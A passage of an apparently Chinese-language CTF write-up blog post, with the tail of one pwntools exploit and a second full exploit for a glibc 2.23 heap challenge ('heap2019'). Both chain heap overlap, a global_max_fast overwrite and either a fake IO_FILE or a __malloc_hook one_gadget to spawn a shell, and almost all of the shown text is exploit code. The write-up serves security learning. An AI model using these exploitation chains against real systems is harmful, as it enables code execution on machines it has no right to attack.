class="line">heap_list=get_heap_addr()</span><br><span class="line">elfbase=heap_list-<span class="number">0x202040</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">ru(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">libcbase=uu64(ru(<span class="string">&quot;\x7f&quot;</span>))-<span class="number">3951480</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 4</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">ru(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">heapbase=uu64(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])-<span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">global_max_fast=libcbase+<span class="number">0x3c67f8</span></span><br><span class="line">_IO_list_all=libcbase+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">fastbinsY=libcbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span>+<span class="number">0x8</span></span><br><span class="line">chunk_size=(_IO_list_all-fastbinsY)*<span class="number">2</span>+<span class="number">0x20</span>-<span class="number">0x10</span></span><br><span class="line">sys_addr=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># construct fake prev_size and size to bypass unlink when add</span></span><br><span class="line">payload=<span class="string">&#x27;c&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0xd8</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">add(<span class="number">0x98</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># update the size</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(chunk_size,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x98</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete 1 and overwrite its size to 0xde</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(heapbase+<span class="number">0xa8</span>-<span class="number">0x3</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(chunk_size+<span class="number">0x10</span>+<span class="number">0xa1</span>)</span><br><span class="line">add(<span class="number">0xa8</span>,payload) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5 will not exist, put all free chunk to small bin to prevent unexpected error</span></span><br><span class="line">ru(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;Content length:\n&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;g&#x27;</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(chunk_size+<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x14a0</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write global_max_fast to 0xdead</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(global_max_fast-<span class="number">0x2</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># House of corrosion</span></span><br><span class="line"><span class="comment"># hijack _IO_list_all</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># construct fake io</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(sys_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">fake_io=<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x1411</span>)</span><br><span class="line">fake_io+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io+=p64(heapbase+<span class="number">0x150</span>) <span class="comment"># vtable</span></span><br><span class="line">payload+=fake_io</span><br><span class="line"><span class="comment"># overwrite 3</span></span><br><span class="line">add(<span class="number">0x14b0</span>-<span class="number">0x10</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;heap_list&quot;</span>,<span class="built_in">hex</span>(heap_list))</span><br><span class="line">leak(<span class="string">&quot;elfbase&quot;</span>,<span class="built_in">hex</span>(elfbase))</span><br><span class="line">leak(<span class="string">&quot;libcbase&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line">leak(<span class="string">&quot;heapbase&quot;</span>,<span class="built_in">hex</span>(heapbase))</span><br><span class="line">leak(<span class="string">&quot;global_max_fast&quot;</span>,<span class="built_in">hex</span>(global_max_fast))</span><br><span class="line">leak(<span class="string">&quot;_IO_list_all&quot;</span>,<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">leak(<span class="string">&quot;fastbinsY&quot;</span>,<span class="built_in">hex</span>(fastbinsY))</span><br><span class="line">leak(<span class="string">&quot;chunk_size&quot;</span>,<span class="built_in">hex</span>(chunk_size))</span><br><span class="line">leak(<span class="string">&quot;sys_addr&quot;</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">ru(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+<h2 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h2><p>如果按照main的思路走的话，一直到overlapping都是一样的，但overlapping的<code>chunk</code>的<code>size</code>有所不同，这里需要另其为<code>0xd0</code>，这样才能通过任意地址写<code>0xde</code>来伪造<code>size</code>。</p>
+<p>首先需要利用任意地址写<code>0xde</code>修改<code>global_max_fast</code>，让<code>0xd0</code>大小的<code>chunk</code>都能被认为是<code>fast bin chunk</code>，之后将overlapping的大小为<code>0xd0</code>的<code>chunk</code>释放到越界的<code>fast bin</code>中。</p>
+<p>打<code>__malloc_hook</code>的话，由于只能任意地址写<code>0xde</code>来伪造<code>size</code>，需要在<code>__malloc_hook</code>前面找一段<code>0x0000000000000000</code>的空间来伪造<code>size</code>。</p>
+<p>伪造好后利用overlapping修改<code>0xd0</code>大小的<code>fast bin</code>中<code>chunk</code>的<code>fd==fake_chunk</code>，之后申请两次即可得到<code>__malloc_hook</code>处的内存，修改其为<code>one_gadget</code>即可<code>get shell</code>。</p>
+<p>exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">       </span><br><span class="line">mode = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">    fang = process(<span class="string">&quot;./heap2019&quot;</span>)  </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fang = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28812</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(fang)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc2</span>(<span class="params">size</span>):</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;Content length:\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size,cont</span>):</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;Content length:\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;Content:\n&quot;</span>)</span><br><span class="line">    fang.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;Content id:\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">cont</span>):</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">    fang.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    fang.recvuntil(<span class="string">&quot;Comment:\n&quot;</span>)</span><br><span class="line">    fang.send(cont)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc-2.23.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/functionmain/桌面/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(fang,&#x27;b *(0x555555400000 + 0xc1d)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">fang.recvuntil(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">fang.sendline(<span class="built_in">str</span>(<span class="number">2019</span>))</span><br><span class="line">fang.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(fang.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x202040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x98</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x98</span></span><br><span class="line">alloc(<span class="number">0x98</span>,payload) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x98</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x98</span></span><br><span class="line">alloc(<span class="number">0x98</span>,pd) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">alloc(<span class="number">0x98</span>,pd) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x98</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">fang.recvuntil(<span class="string">&quot;Data is:\n&quot;</span>)</span><br><span class="line">libc_base = u64(fang.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b61</span></span><br><span class="line">one_gadget4 = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget_addr = libc_base + one_gadget4[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">0x98</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">fang.recvuntil(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line">heap_base = u64(fang.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是0x28且size是0xd8是因为前一个chunk的size被修改为0xde，除去标志位的size就是0xd8，而寻找下一个chunk是依靠size的大小的</span></span><br><span class="line"><span class="comment"># 因此会认为chunk_addr+size，所以会找到0xd8的位置，并认为他是prev_size</span></span><br><span class="line"><span class="comment"># 正常情况下size都是0x10对齐的(64bit下)，但这里不是，所以会出现这样的情况</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0xd8</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">alloc(<span class="number">0x98</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(heap_base + <span class="number">0xa8</span> - <span class="number">3</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 余下的要大于MIN_SIZE才会切割，顺便改写id==2的size</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x141</span>)</span><br><span class="line">alloc(<span class="number">0xa8</span>,payload) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">alloc2(<span class="number">0x98</span>) <span class="comment"># 5 马上free的，只是把unsorted剩下的赶进去small bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 放进 unsorted bin</span></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xd1</span>)</span><br><span class="line">alloc(<span class="number">0x130</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 global_max_fast</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(libc_base + <span class="number">0x3c67f8</span> - <span class="number">3</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入 fastbinsY，越界写到了last_remainder</span></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在__malloc_hook前伪造size</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x30</span> + <span class="number">8</span> - <span class="number">3</span>)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆写fd指向fake chunk(__malloc_hook前)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xd1</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x30</span> )</span><br><span class="line">alloc(<span class="number">0x130</span>,payload) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xc0</span>,<span class="string">&#x27;BBBB&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配并修改malloc</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span> + p64(one_gadget_addr) + p64(libc_base + libc.symbols[<span class="string">&quot;realloc&quot;</span>])</span><br><span class="line">alloc(<span class="number">0xc0</span>,payload) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(fang,&#x27;b *(0x555555400000 + 0xAC9)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">alloc2(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;elf_base : 0x%x&quot;</span> % elf_base)</span><br><span class="line">log.info(<span class="string">&quot;libc_base : 0x%x&quot;</span> % libc_base)</span><br><span class="line">log.info(<span class="string">&quot;heap_base : 0x%x&quot;</span> % heap_base)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">fang.interactive()</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/house-of-xxx/" rel="tag"># house_of_xxx</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/01/10/CatCFT-Welcome/" rel="prev" title="CatCFT_Welcome">
+      <i class="fa fa-chevron-left"></i> CatCFT_Welcome
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/01/13/setcontext/" rel="next" title="setcontext">
+      setcontext <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#leak"><span class="nav-number">1.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#overlapping"><span class="nav-number">2.</span> <span class="nav-text">overlapping</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#House-of-Corrision"><span class="nav-number">3.</span> <span class="nav-text">House of Corrision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-number">4.</span> <span class="nav-text">FSOP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">5.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%80%9D%E8%B7%AF"><span class="nav-number">6.</span> <span class="nav-text">其他思路</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="a1ph0nse"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">a1ph0nse</p>
+  <div class="site-description" itemprop="description">pwn菜狗、cs菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">a1ph0nse</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
